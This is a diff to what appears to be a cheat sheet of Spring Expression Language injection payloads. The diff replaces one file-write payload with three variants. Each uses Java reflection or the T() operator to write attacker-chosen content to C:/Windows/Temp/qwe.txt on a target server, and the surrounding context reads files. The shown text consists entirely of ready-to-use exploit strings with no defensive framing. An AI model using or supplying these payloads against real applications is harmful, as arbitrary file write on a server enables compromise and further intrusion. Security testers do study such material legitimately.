@@ -57,7 +57,11 @@ T(java.nio.file.Files).readAllBytes("".getClass().forName("java.nio.file.Paths")
 ```java
 // not at uri "file:/" prefix
 // change "hello" to your file content
-{"".getClass().forName("java.nio.file.Files").getMethod("write","".getClass().forName("java.nio.file.Path"),"".getClass().forName("[B"),"".getClass().forName("[Ljava.nio.file.OpenOption;")).invoke("","".getClass().forName("java.nio.file.Paths").getMethod("get","".getClass().forName("java.net.URI")).invoke(null,"".getClass().forName("java.net.URI").getConstructor("".getClass()).newInstance("file:/C:/Windows/Temp/qwe.txt")), "hello".getBytes(), new java.nio.file.OpenOption[] {"".getClass().forName("java.nio.file.StandardOpenOption").getField("CREATE").get(null)})
+"".getClass().forName("java.nio.file.Files").getMethod("write","".getClass().forName("java.nio.file.Path"),"".getClass().forName("[B"),"".getClass().forName("[Ljava.nio.file.OpenOption;")).invoke("","".getClass().forName("java.nio.file.Paths").getMethod("get","".getClass().forName("java.net.URI")).invoke(null,"".getClass().forName("java.net.URI").getConstructor("".getClass()).newInstance("file:/C:/Windows/Temp/qwe.txt")), "hello".getBytes(), new java.nio.file.OpenOption[] {"".getClass().forName("java.nio.file.StandardOpenOption").getField("CREATE").get(null)})
+
+T(java.nio.file.Files).write("".getClass().forName("java.nio.file.Paths").getMethod("get","".getClass().forName("java.net.URI")).invoke(null,"".getClass().forName("java.net.URI").getConstructor("".getClass()).newInstance("file:/C:/Windows/Temp/qwe.txt")), "hello".getBytes(), new java.nio.file.OpenOption[] {"".getClass().forName("java.nio.file.StandardOpenOption").getField("CREATE").get(null)})
+
+T(java.nio.file.Files).write("".getClass().forName("java.nio.file.Paths").getMethod("get","".getClass().forName("java.net.URI")).invoke(null,new java.net.URI("file:/C:/Windows/Temp/qwe.txt")), "hello".getBytes(), new java.nio.file.OpenOption[] {"".getClass().forName("java.nio.file.StandardOpenOption").getField("CREATE").get(null)})
 
 ```
 
